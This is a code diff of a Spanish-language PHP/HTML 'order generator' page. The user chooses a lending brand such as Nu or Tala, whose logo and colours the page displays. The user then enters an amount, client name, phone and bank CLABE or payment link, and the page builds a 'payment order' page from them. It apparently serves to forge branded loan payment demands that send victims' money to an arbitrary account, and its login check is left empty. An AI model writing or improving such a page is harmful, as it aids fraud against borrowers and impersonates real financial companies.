@@ -1,28 +1,35 @@
+<?php
+// Mantenemos tu lógica de sesión original
+session_start();
+if (!isset($_SESSION['user'])) {
+    // Aquí va tu redirección al login si es necesario
+}
+?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel de Control - Generador</title>
+    <title>Generador de Órdenes</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { font-family: 'Inter', sans-serif; background-color: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card-panel { width: 100%; max-width: 420px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
-        input, select { width: 100%; padding: 0.85rem; border: 2px solid #f1f5f9; border-radius: 1rem; font-weight: 700; color: #1e293b; outline: none; transition: all 0.2s; }
-        input:focus, select:focus { border-color: #3b82f6; background: #f8fafc; }
-        label { display: block; text-align: center; font-size: 0.65rem; font-weight: 900; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.4rem; }
+        body { font-family: 'Inter', sans-serif; background-color: #065f46; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .container { width: 100%; max-width: 400px; background: white; border-radius: 2rem; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.3); }
+        select, input { width: 100%; padding: 0.75rem; border: 1px solid #e2e8f0; border-radius: 0.75rem; font-weight: 700; text-align: center; color: #1e293b; outline: none; }
+        input:focus { border-color: #10b981; }
+        label { display: block; text-align: center; font-[900] text-[10px] text-slate-400 uppercase tracking-widest mb-1; }
     </style>
 </head>
 <body>
 
-<div class="card-panel">
-    <div id="header-preview" class="p-8 text-center transition-colors duration-500" style="background-color: #06b6d4;">
-        <div class="w-24 h-24 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden shadow-xl border-4 border-white/20">
-            <img id="logo-preview" src="https://tala.co/wp-content/uploads/2021/10/Social-Media-Image.png" class="w-full h-full object-cover">
+<div class="container">
+    <div id="app-header" class="p-8 text-center transition-colors duration-500" style="background-color: #06b6d4;">
+        <div class="w-20 h-20 bg-white rounded-2xl mx-auto mb-4 flex items-center justify-center overflow-hidden shadow-md border-4 border-white/20">
+            <img id="preview-img" src="https://tala.co/wp-content/uploads/2021/10/Social-Media-Image.png" class="w-full h-full object-cover">
         </div>
         
-        <select id="v" onchange="cambiarApp()">
+        <select id="v" onchange="actualizarInterfaz()">
             <option value="prestamos">Préstamos</option>
             <option value="dinero">Préstamos de Dinero</option>
             <option value="nu">Préstamos NU</option>
@@ -38,10 +45,10 @@
         </select>
     </div>
 
-    <div class="p-7 space-y-5">
-        <div class="grid grid-cols-2 gap-4">
+    <div class="p-6 space-y-4">
+        <div class="grid grid-cols-2 gap-3">
             <div>
-                <label>Monto ($)</label>
+                <label>Monto</label>
                 <input type="number" id="m" placeholder="2000">
             </div>
             <div>
@@ -57,27 +64,31 @@
 
         <div>
             <label>Nombre del Cliente</label>
-            <input type="text" id="n" placeholder="Nombre Completo" style="text-transform: uppercase;">
+            <input type="text" id="n" placeholder="JUAN PEREZ" style="text-transform: uppercase;">
         </div>
 
         <div>
             <label>Teléfono</label>
-            <input type="text" id="t" placeholder="10 Dígitos">
+            <input type="text" id="t" placeholder="10 dígitos">
         </div>
 
         <div>
-            <label>CLABE / Liga de Pago</label>
-            <input type="text" id="c" placeholder="Número de cuenta o CLABE">
+            <label>CLABE / LIGA DE PAGO</label>
+            <input type="text" id="c" placeholder="0120100...">
         </div>
 
-        <button onclick="enviar()" class="w-full bg-slate-900 hover:bg-black text-white font-black py-4 rounded-2xl transition-all uppercase tracking-widest shadow-lg active:scale-95">
+        <button onclick="generar()" class="w-full bg-slate-800 hover:bg-black text-white font-black py-4 rounded-xl transition-all uppercase tracking-tighter shadow-lg active:scale-95">
             Generar Orden de Pago
         </button>
+        
+        <div class="text-center pt-2">
+            <a href="logout.php" class="text-[10px] font-bold text-red-500 uppercase hover:underline">Cerrar Sesión</a>
+        </div>
     </div>
 </div>
 
 <script>
-    const configApps = {
+    const datosApps = {
         'prestamos': { c: '#a3e635', i: 'https://play-lh.googleusercontent.com/OhU802wo_ffOcR5f6MAvz5ebNFvXOLDiC2p_b7kGS7_XBwFz3HI9jtNn6C8fBiQrzjUx' },
         'dinero': { c: '#1e40af', i: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' },
         'nu': { c: '#820ad1', i: 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png' },
@@ -92,14 +103,14 @@
         'tala': { c: '#fb923c', i: 'https://play-lh.googleusercontent.com/LVhWYJjxouE6-Exr-6kmktigDIOeGPEq4JHSGfkaEKhkmBwaXYkWS0Pv6SDIr5REsvHu=w480-h960-rw' }
     };
 
-    function cambiarApp() {
-        const seleccion = document.getElementById('v').value;
-        const app = configApps[seleccion];
-        document.getElementById('header-preview').style.backgroundColor = app.c;
-        document.getElementById('logo-preview').src = app.i;
+    function actualizarInterfaz() {
+        const sel = document.getElementById('v').value;
+        const app = datosApps[sel];
+        document.getElementById('app-header').style.backgroundColor = app.c;
+        document.getElementById('preview-img').src = app.i;
     }
 
-    function enviar() {
+    function generar() {
         const v = document.getElementById('v').value;
         const m = document.getElementById('m').value;
         const b = document.getElementById('b').value;
@@ -107,13 +118,11 @@
         const t = document.getElementById('t').value;
         const c = document.getElementById('c').value;
 
-        // Construir URL con parámetros
-        const url = `detalle.html?v=${v}&m=${m}&b=${b}&n=${encodeURIComponent(n)}&t=${t}&c=${c}`;
-        window.location.href = url;
+        window.location.href = `detalle.html?v=${v}&m=${m}&b=${b}&n=${encodeURIComponent(n)}&t=${t}&c=${c}`;
     }
 
-    // Iniciar con la app seleccionada
-    cambiarApp();
+    // Inicializar
+    actualizarInterfaz();
 </script>
 
 </body>
